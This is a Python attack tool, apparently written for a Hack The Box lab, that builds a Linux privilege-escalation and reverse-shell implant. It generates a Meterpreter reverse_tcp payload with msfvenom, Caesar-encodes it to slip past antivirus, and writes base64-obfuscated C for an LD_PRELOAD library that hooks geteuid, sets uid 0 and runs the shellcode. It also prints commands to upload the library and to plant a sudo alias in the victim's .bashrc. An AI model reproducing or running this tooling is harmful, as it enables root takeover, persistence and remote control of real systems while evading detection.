import os,sys
import base64
import argparse
from random import choice

stage_encoding = "0" #"0" #"1"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def resourcefile(msf_payload,lhost,lport,bitness):
    rcfilename = "linux.rc"
    with open(rcfilename,'w') as f:
        f.write("use exploit/multi/handler" + "\n")
        f.write("set payload %s\n" % msf_payload)
        f.write("set lhost %s\n" % lhost)
        f.write("set lport %s\n" % lport)
        if stage_encoding == "1":
            f.write("set EnableStageEncoding true\n")
            if bitness == "64": 
                f.write("set StageEncoder x64/zutto_dekiru\n") # only if x64
                print('[!] warning: "StageEncoder x64/zutto_dekiru" in use')
        f.write("run\n")
    f.close()
    print ('[+] msf resource script written: %s -> use:\nsudo msfconsole -r %s [or] resource %s' % (rcfilename,rcfilename,rcfilename))
    pass

def genlinux(lhost,lport,bitness,pformat):
    msf_payload = "linux/x64/meterpreter/reverse_tcp"
    if bitness == "32":
        msf_payload = "linux/meterpreter/reverse_tcp"
    cmd = "msfvenom -p "+msf_payload+" LHOST="+lhost+" LPORT="+lport+" EXITFUNC=thread -f "+pformat+" -o met"+bitness+"."+pformat+""
    os.system(cmd)
    #print (cmd)
    print ('[+] met generated: lhost %s, lport %s, bitness %s, format %s' % (lhost,lport,bitness,pformat))
    print ('[!] msfvenom: %s' % cmd)
    resourcefile(msf_payload,lhost,lport,bitness)
    pass

def bxor(b1, b2):
    res = bytes([_a ^ _b for _a, _b in zip(b1, b2)])
    res = "{:02x}".format(ord(res))
    res = "\\x" + res
    return res

def bcaesar(b1,b2):
    res = b1 + b2
    res = int(res)
    res = res & 0xff
    res = hex(res).split('x')[-1]
    if len(res) == 1:
        res = "0" + res
    #print((res))
    return res

#tmp = int("ff",16) #ff #48
#key = int(8)
#bcaesar(tmp,key)

def caesar_buffer_c(bufferstring):
    '''
    int main (int argc, char **argv)
    {
        //caesar with key '+8'
        int caesar_key = 8;
        int payload_length = (int) sizeof(buf);

        for (int i=0; i<payload_length; i++)
        {
            printf("\\x%02X",(buf[i] + caesar_key) & 0xFF);
        }
        return 0;
    }
    '''
    m = bufferstring.split("\n")
    #print(m)
    mheader = "unsigned char buf[] =\n"
    mpayload = m[1:-1]
    mtail = "\";\n"
    #print (mheader)
    #print (mpayload)
    mbytes = []
    for nbytes in mpayload:
        nbytes = nbytes[1:-1]
        nbytes = nbytes.split('\\x')[1:]
        nbytes = [x.strip() for x in nbytes]
        nbytes = [x.replace('"','') for x in nbytes]
        for obyte in nbytes:
            mbytes.append(obyte)
        #print (nbytes)
    #print (mbytes)
    mres = []
    #xorkey = bytes.fromhex("fa")
    caesarkey = 8
    count = 1
    for byte in mbytes:
        #print (byte)
        tmp = byte
        #print (tmp)
        if len(tmp) == 1:
            tmp = "0" + tmp
        #print (tmp)
        #tmp = bytes.fromhex(tmp)
        tmp = int(tmp,16)
        #res = bxor(tmp,xorkey)
        res = bcaesar(tmp,caesarkey)
        res = "\\x%s" % res
        #print(res)
        if count == 1:
            res = "\"" + res
        if count == 15:
            res = res + "\"\n" #.decode('iso8859-1') #.encode('ASCII') #'latin1'
            count = 0
        count += 1
        mres.append(res)
    #print (mres)
    msfres = "".join(mres)
    buflen = len(mres)
    mheader = mheader #% str(buflen)
    msfres = mheader + msfres + mtail#'''
    #print (msfres)
    return msfres
    pass

def writehaxcp(bitness,lhost,lport,shcmd):
    haxfilename = "haxcp.c"

    if shcmd == "0":
        upper = "I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3lzL21tYW4uaD4gLy8gZm9yIG1wcm90ZWN0CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+Cgp1aWRfdCBnZXRldWlkKHZvaWQpIAp7CiAgICB0eXBlb2YoZ2V0dWlkKSAqb2xkX2dldGV1aWQ7CiAgICBvbGRfZ2V0ZXVpZCA9IGRsc3ltKFJUTERfTkVYVCwgImdldGV1aWQiKTsKCiAgICAvL3N1ZG8gbXNmdmVub20gLXAgbGludXgveDY0L21ldGVycHJldGVyL3JldmVyc2VfdGNwIGxob3N0PTEwLjEwLjE0LjMxIGxwb3J0PTQ0MyBleGl0ZnVuYz10aHJlYWQgLWYgYyAtbyBtZXQ2NC5jCiAgICAvL2NhZXNhciB3aXRoIGtleSAiKzgi"
        lower = "ICAgIGlmIChmb3JrKCkgPT0gMCkKICAgIHsKICAgICAgICBzZXR1aWQoMCk7CiAgICAgICAgc2V0Z2lkKDApOwogICAgICAgIAogICAgICAgIHByaW50ZigiaG9sYTFcbiIpOwogICAgICAgIGludHB0cl90IHBhZ2VzaXplID0gc3lzY29uZihfU0NfUEFHRVNJWkUpOwogICAgICAgIHByaW50ZigicGFnZXNpemU6ICVsZFxuIixwYWdlc2l6ZSk7CiAgICAgICAgaW50cHRyX3QgYnVmYWRkciA9IChpbnRwdHJfdClidWYgJiB+KHBhZ2VzaXplIC0gMSk7CiAgICAgICAgcHJpbnRmKCJidWZhZGRyOiAlbGRcbiIsYnVmYWRkcik7CiAgICAgICAgLy9tcHJvdGVjdCgodm9pZCAqKSgoKGludHB0cl90KWJ1ZikgJiB+KHBhZ2VzaXplIC0gMSkpLCBwYWdlc2l6ZSwgUFJPVF9SRUFEfFBST1RfRVhFQyk7CiAgICAgICAgaWYgKG1wcm90ZWN0KCh2b2lkICopKCgoaW50cHRyX3QpYnVmKSAmIH4ocGFnZXNpemUgLSAxKSksIHBhZ2VzaXplLCBQUk9UX1JFQUR8UFJPVF9XUklURXxQUk9UX0VYRUMpKSAKICAgICAgICB7CiAgICAgICAgICAgIHBlcnJvcigibXByb3RlY3QiKTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KICAgICAgICAvL2RlY29kZSBzaGVsbGNvZGUgYWNjb3JkaW5nbHkgKHhvciBvciBjYWVzYXIpCiAgICAgICAgLy9jaGFyIHhvcl9rZXkgPSAnSic7CiAgICAgICAgaW50IGNhZXNhcl9rZXkgPSA4OwogICAgICAgIGludCBhcnJheXNpemUgPSAoaW50KSBzaXplb2YoYnVmKTsKICAgICAgICBwcmludGYoImRlY29kaW5nIHNoZWxsY29kZSAxXG4iKTsKICAgICAgICBmb3IgKGludCBpPTA7IGk8YXJyYXlzaXplLTE7IGkrKykgCiAgICAgICAgewogICAgICAgICAgICAvL2J1ZltpXSA9IGJ1ZltpXV54b3Jfa2V5OwogICAgICAgICAgICBidWZbaV0gPSAoYnVmW2ldIC0gY2Flc2FyX2tleSkgJiAweEZGOwogICAgICAgIH0KICAgICAgICBwcmludGYoInJ1bm5pbmcgc2hlbGxjb2RlXG4iKTsKICAgICAgICAvL3J1biBvdXIgc2hlbGxjb2RlCiAgICAgICAgaW50ICgqcmV0KSgpID0gKGludCgqKSgpKWJ1ZjsKICAgICAgICByZXQoKTsKICAgIH0KICAgIGVsc2UgCiAgICB7CiAgICAgICAgcHJpbnRmKCJIQUNLOiByZXR1cm5pbmcgZnJvbSBmdW5jdGlvbi4uLlxuIik7CiAgICAgICAgcmV0dXJuICgqb2xkX2dldGV1aWQpKCk7CiAgICB9CiAgICBwcmludGYoIkhBQ0s6IFJldHVybmluZyBmcm9tIG1haW4uLi5cbiIpOyAKICAgIHJldHVybiAtMjsKfQ=="

        msffilename = "met%s.c" % (bitness)
        m = open(msffilename,'r')
        msf = m.read()
        m.close()
        #print(msf)
        msf = caesar_buffer_c(msf) # 5/26 -defender
        #print(msf) 

    if shcmd != "0":
        print('[+] shcmd: %s' % shcmd)
        print('[!] warning! shcmd with haxcp tested to loop forever on victim! don\'t use if unnecessary!')
        upper = "I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3lzL21tYW4uaD4gLy8gZm9yIG1wcm90ZWN0CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+Cgp1aWRfdCBnZXRldWlkKHZvaWQpIAp7CiAgICB0eXBlb2YoZ2V0dWlkKSAqb2xkX2dldGV1aWQ7CiAgICBvbGRfZ2V0ZXVpZCA9IGRsc3ltKFJUTERfTkVYVCwgImdldGV1aWQiKTsKCiAgICBpZiAoZm9yaygpID09IDApCiAgICB7CiAgICAgICAgc2V0dWlkKDApOwogICAgICAgIHNldGdpZCgwKTs="
        lower = "ICAgICAgICByZXR1cm4gKCpvbGRfZ2V0ZXVpZCkoKTsKICAgIH0KICAgIGVsc2UgCiAgICB7CiAgICAgICAgcHJpbnRmKCJIQUNLOiByZXR1cm5pbmcgZnJvbSBmdW5jdGlvbi4uLlxuIik7CiAgICAgICAgcmV0dXJuICgqb2xkX2dldGV1aWQpKCk7CiAgICB9CiAgICBwcmludGYoIkhBQ0s6IFJldHVybmluZyBmcm9tIG1haW4uLi5cbiIpOyAKICAgIHJldHVybiAtMjsKfQ=="

        msf = "system(\"%s\");" % shcmd

    with open(haxfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("    " + msf + "\n")
        f.write(lower)
    f.close()

    print('[+] haxcp c written: %s' % haxfilename)
    return haxfilename
    pass

def makehaxcp(bitness,lhost,lport,shcmd):
    if shcmd == "0":
        genlinux(lhost,lport,bitness,"c")
    haxfilename = writehaxcp(bitness,lhost,lport,shcmd)
    haxfilenamereal = haxfilename.split(".")[0].strip()

    targethomedir = "/home/reader/"
    targetlibdir = "%sldlib/" % targethomedir
    #targetlibname = "%s.so" % rand_word()

    compilebin = "gcc -Wall -fPIC -z execstack -c -o %s.o %s.c" % (haxfilenamereal,haxfilenamereal)
    compiledll = "gcc -shared -o %s.so %s.o -ldl" % (haxfilenamereal,haxfilenamereal)
    os.system(compilebin)
    os.system(compiledll)
    print('[+] %s.so compiled: %s.so' % (haxfilenamereal,haxfilenamereal))

    # switch SSH target accordingly!
    scpcmd = "scp -i ~/htb/labs/book/ssh/reader.pem ./%s.so reader@book.htb:/home/reader/" % haxfilenamereal
    print('[+] upload:\nupload %s.so' % haxfilenamereal)
    print(scpcmd)

    loadcmd = "echo 'alias sudo=\"sudo LD_PRELOAD=%s%s.so\"' >> %s.bashrc" % (targetlibdir,haxfilenamereal,targethomedir)
    sourcecmd = "source %s.bashrc" % targethomedir
    exportcmd = "mkdir %s\nmv %s.so %s\nexport LD_PRELOAD=%s%s.so" % (targetlibdir,haxfilenamereal,targetlibdir,targetlibdir,haxfilenamereal)
    print('[+] setup on victim:')
    print(loadcmd)
    print(sourcecmd)
    print(exportcmd)

    usagecmd = "sudo cp /etc/passwd /tmp/testpasswd"
    print('[+] evil usage:')
    print(usagecmd)

    cleanupcmd = "unset LD_PRELOAD"
    print('[+] cleanup:')
    print(cleanupcmd)

    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--cmd','-c',required=False,dest='shcmd',help='shell command')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    shcmd = args.shcmd

    if shcmd == None:
        shcmd = "0"

    #writehaxcp(bitness,lhost,lport,shcmd)
    makehaxcp(bitness,lhost,lport,shcmd)